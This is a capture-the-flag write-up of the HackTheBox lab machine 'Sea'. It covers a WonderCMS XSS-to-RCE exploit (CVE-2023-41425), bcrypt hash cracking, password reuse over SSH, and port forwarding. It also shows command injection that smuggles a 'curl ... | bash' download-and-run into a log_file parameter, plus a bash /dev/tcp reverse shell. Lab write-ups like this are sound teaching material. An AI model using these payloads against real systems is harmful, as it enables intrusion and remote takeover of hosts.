# Sea - HackTheBox - Writeup
Linux, 20 Base Points, Easy

![info.JPG](images/info.JPG)

## Machine

![‏‏Sea.JPG](images/Sea.JPG)
 
## TL;DR

To solve this machine, we start by using `nmap` to enumerate open services and find ports `22` and `80`.

***User***: Discovered XSS on the `contact` page and identified `WonderCMS`. Used `CVE-2023-41425` to obtain a reverse shell as `www-data`. Found a hashed password for the `amay` user in the `database.js` file.

***Root***: Used local port forwarding to access port `8080` and found a website vulnerable to command injection. Exploiting this, we obtained a reverse shell as `root`.

![pwn.JPG](images/pwn.JPG)


## Sea Solution

### User

Let's begin by using `nmap` to scan the target machine:

```console
┌─[evyatar9@parrot]─[/hackthebox/Sea]
└──╼ $ nmap -sV -sC -oA nmap/Sea 10.10.11.28
Starting Nmap 7.93 ( https://nmap.org ) at 2024-10-26 23:22 IDT
Nmap scan report for 10.10.11.28
Host is up (0.080s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e354e072203c014293d1669d900cabe8 (RSA)
|   256 f3244b08aa519d56153d6756747c2038 (ECDSA)
|_  256 30b105c64150ff22a37f41060e67fd50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sea - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Observing port `80`, we see that the following web page is hosted:

![port80.JPG](images/port80.JPG)

By clicking on the [How To Participate](http://sea.htb/how-to-participate) link, we are directed to the following page:

![howto.JPG](images/howto.JPG)

Clicking on the [contact](http://sea.htb/contact.php) button navigates us to the following page:

![contact.JPG](images/contact.JPG)

We found that if we register with any website, the server makes a request to that site.

Running `dirbuster` reveals the path http://sea.htb/themes/bike/:

![dirbuster.JPG](images/dirbuster.JPG)

Using `gobuster`, we discover a few interesting files:
```console
┌─[evyatar9@parrot]─[/hackthebox/Sea]
└──╼ $ gobuster dir -u http://sea.htb/themes/bike/  -w ../Utils/Web/quickhits.txt -t 100 -k --wildcard -o preprod.gobuster
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sea.htb/themes/bike/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                ../Utils/Web/quickhits.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2024/10/26 23:57:08 Starting gobuster in directory enumeration mode
===============================================================
/README.md            (Status: 200) [Size: 318]
/sym/root/home/       (Status: 200) [Size: 3650]
/version              (Status: 200) [Size: 6]   
```

Browsing the page at http://sea.htb/themes/bike/README.md, we see the following content:
```console
# WonderCMS bike theme

## Description
Includes animations.

## Author: turboblack

## Preview
![Theme preview](/preview.jpg)

## How to use
1. Login to your WonderCMS website.
2. Click "Settings" and click "Themes".
3. Find theme in the list and click "install".
4. In the "General" tab, select theme to activate it.
```

Browsing to `http://sea.htb/themes/bike/version` displays `3.2.0`.

For this version of `WonderCMS`, we can exploit [CVE-2023-41425](https://github.com/thefizzyfish/CVE-2023-41425-wonderCMS_RCE).

It can be run using:
```console
┌─[evyatar9@parrot]─[/hackthebox/Sea]
└──╼ $ python3 CVE-2023-41425.py -rhost http://sea.htb/loginURL -lhost 10.10.14.14 -lport 9001 -sport 8000
[+] Set up a nc listener: nc -lnvp 9001
[+] Send the xss URL to the victim: 
http://sea.htb/loginURL/index.php?page=loginURL?"></form><script+src="http://10.10.14.14:8000/xss.js"></script><form+action="
[+] Serving at http://10.10.14.14:8000
```

We can use the [contact](http://sea.htb/contact.php) form found earlier to trigger the XSS:

![contactXSS.JPG](images/contactXSS.JPG)

After sending the request, we receive the following responses from the server:
```console
┌─[evyatar9@parrot]─[/hackthebox/Sea]
└──╼ $ python3 CVE-2023-41425.py -rhost http://sea.htb/loginURL -lhost 10.10.14.14 -lport 9001 -sport 8000
[+] Set up a nc listener: nc -lnvp 9001
[+] Send the xss URL to the victim: 
http://sea.htb/loginURL/index.php?page=loginURL?"></form><script+src="http://10.10.14.14:8000/xss.js"></script><form+action="
[+] Serving at http://10.10.14.14:8000
10.10.11.28 - - [30/Oct/2024 15:12:53] "GET /xss.js HTTP/1.1" 200 -
10.10.11.28 - - [30/Oct/2024 15:12:58] "GET /shell.zip HTTP/1.1" 200 -
10.10.11.28 - - [30/Oct/2024 15:12:58] "GET /shell.zip HTTP/1.1" 200 -
10.10.11.28 - - [30/Oct/2024 15:12:58] "GET /shell.zip HTTP/1.1" 200 -
10.10.11.28 - - [30/Oct/2024 15:12:59] "GET /shell.zip HTTP/1.1" 200 -
```

And we get a reverse shell as `www-data`:
```console
┌─[evyatar9@parrot]─[/hackthebox/Sea]
└──╼ $ nc -lvp 9001
listening on [any] 9001 ...
connect to [10.10.14.14] from sea.htb [10.10.11.28] 44186
bash: cannot set terminal process group (1182): Inappropriate ioctl for device
bash: no job control in this shell
www-data@sea:/var/www/sea/themes/shell$
```

By examining the files, we found a file named `database.js`:
```console
www-data@sea:/var/www/sea/data$ cat database.js
cat database.js
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
        "lastLogins": {
            "2024\/10\/30 13:13:19": "127.0.0.1",
            "2024\/10\/30 13:12:49": "127.0.0.1",
            "2024\/10\/30 13:12:19": "127.0.0.1",
            "2024\/10\/30 13:04:48": "127.0.0.1",
            "2024\/10\/30 12:58:18": "127.0.0.1"
        },
        "lastModulesSync": "2024\/10\/30",
        "customModules": {
            "themes": {},
            "plugins": {}
        },
        "menuItems": {
            "0": {
                "name": "Home",
                "slug": "home",
                "visibility": "show",
                "subpages": {}
            },
            "1": {
                "name": "How to participate",
                "slug": "how-to-participate",
                "visibility": "show",
                "subpages": {}
            }
        },
        "logoutToLoginScreen": {}
    },
    "pages": {
        "404": {
            "title": "404",
            "keywords": "404",
            "description": "404",
            "content": "<center><h1>404 - Page not found<\/h1><\/center>",
            "subpages": {}
        },
        "home": {
            "title": "Home",
            "keywords": "Enter, page, keywords, for, search, engines",
            "description": "A page description is also good for search engines.",
            "content": "<h1>Welcome to Sea<\/h1>\n\n<p>Hello! Join us for an exciting night biking adventure! We are a new company that organizes bike competitions during the night and we offer prizes for the first three places! The most important thing is to have fun, join us now!<\/p>",
            "subpages": {}
        },
        "how-to-participate": {
            "title": "How to",
            "keywords": "Enter, keywords, for, this page",
            "description": "A page description is also good for search engines.",
            "content": "<h1>How can I participate?<\/h1>\n<p>To participate, you only need to send your data as a participant through <a href=\"http:\/\/sea.htb\/contact.php\">contact<\/a>. Simply enter your name, email, age and country. In addition, you can optionally add your website related to your passion for night racing.<\/p>",
            "subpages": {}
        }
    },
    "blocks": {
        "subside": {
            "content": "<h2>About<\/h2>\n\n<br>\n<p>We are a company dedicated to organizing races on an international level. Our main focus is to ensure that our competitors enjoy an exciting night out on the bike while participating in our events.<\/p>"
        },
        "footer": {
            "content": "©2024 Sea"
        }
    }
}
```

We found the hashed password `$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q`. We can crack it using `john` by removing the `/` as follows:`$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q`:
```console
┌─[evyatar9@parrot]─[/hackthebox/Sea]
└──╼ $ john --wordlist=~/Desktop/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mychemicalromance (?)
1g 0:00:00:21 DONE (2024-10-30 15:20) 0.04629g/s 141.6p/s 141.6c/s 141.6C/s iamcool..memories
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We successfully cracked the password as `mychemicalromance`.

In the `/home` directory, we found two users:
```console
www-data@sea:/var/www/sea/data$ ls -ltra /home/  
ls -ltra /home/
total 16
drwxr-xr-x 19 root root 4096 Feb 21  2024 ..
drwxr-xr-x  4 root root 4096 Jul 30 12:58 .
drwxr-x---  4 geo  geo  4096 Aug  1 12:13 geo
drwxr-xr-x  4 amay amay 4096 Aug  1 12:22 amay
````

We can reuse the password `mychemicalromance` for SSH login as the user `amay`:
```console
┌─[evyatar9@parrot]─[/hackthebox/Sea]
└──╼ $ ssh amay@sea.htb
The authenticity of host 'sea.htb (10.10.11.28)' can't be established.
ECDSA key fingerprint is SHA256:4GOnA9qiUZiTlh3QY7W49OgTASjNb2Zrg2sCy9Dr86o.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'sea.htb,10.10.11.28' (ECDSA) to the list of known hosts.
amay@sea.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed 30 Oct 2024 01:22:12 PM UTC

  System load:  1.2               Processes:             248
  Usage of /:   63.8% of 6.51GB   Users logged in:       1
  Memory usage: 15%               IPv4 address for eth0: 10.10.11.28
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Oct 30 13:03:58 2024 from 10.10.14.10
amay@sea:~$ cat user.txt
92a772d0f5c676185024821334a20164
```

And we get the user flag `92a772d0f5c676185024821334a20164`.

### Root

By running `netstat -tulpan`, we obtain the following output:
```console
amay@sea:~$ netstat -tulpan
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:45043         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -             
```

We can use local port forwarding to gain access to port `8080` as follows:
```console
┌─[evyatar9@parrot]─[/hackthebox/Sea]
└──╼ $ ssh -N -L 8888:127.0.0.1:8080 amay@sea.htb
amay@sea.htb's password:

```

Now, by browsing to http://127.0.0.1:8888, we are prompted to authenticate. Using the same credentials for `amay`, we successfully log in:

![monitor.JPG](images/monitor.JPG)

Clicking on `Analyze`, we can observe the following POST request being sent:
```http
POST / HTTP/1.1
Host: 127.0.0.1:8888
Content-Length: 79
Cache-Control: max-age=0
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8888
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://127.0.0.1:8888/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: keep-alive

log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&analyze_log=
```

We discovered a command injection vulnerability in the `log_file` parameter by using `;`, as follows:
```http
POST / HTTP/1.1
Host: 127.0.0.1:8888
Content-Length: 79
Cache-Control: max-age=0
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8888
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://127.0.0.1:8888/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: keep-alive

log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log%3bping+-c1+10.10.14.14&analyze_log=
```

Let's use it to obtain a reverse shell:
```http
POST / HTTP/1.1
Host: 127.0.0.1:8888
Content-Length: 79
Cache-Control: max-age=0
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8888
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://127.0.0.1:8888/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: keep-alive

log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log%3bcurl+http%3a//10.10.14.14%3a8000/rev.sh|bash&analyze_log=
```

Where the content of `rev.sh` is as follows:
```console
bash -i >& /dev/tcp/10.10.14.14/4242 0>&1
```

By sending the `POST` request, we obtain a reverse shell:
```console
┌─[evyatar9@parrot]─[/hackthebox/Sea]
└──╼ $ nc -lvp 4242
listening on [any] 4242 ...
connect to [10.10.14.14] from sea.htb [10.10.11.28] 37692
bash: cannot set terminal process group (70642): Inappropriate ioctl for device
bash: no job control in this shell
root@sea:~/monitoring# cat /root/root.txt
cat /root/root.txt
eaee0a2f882cd3a98fcced4be3c2a919
```

And we get the root flag `eaee0a2f882cd3a98fcced4be3c2a919`.


PDF password:
```console
$6$llVzHhr7xHrvx1wJ$gH0PLbyPaIOqLrpjpzGZbM2bZ/iHaOfv/bj1YRrktVeZ8.1KQ0Jr1Rv/TL/3Qdh84Fwec1UhX2v0LVAGsuzq.0
```
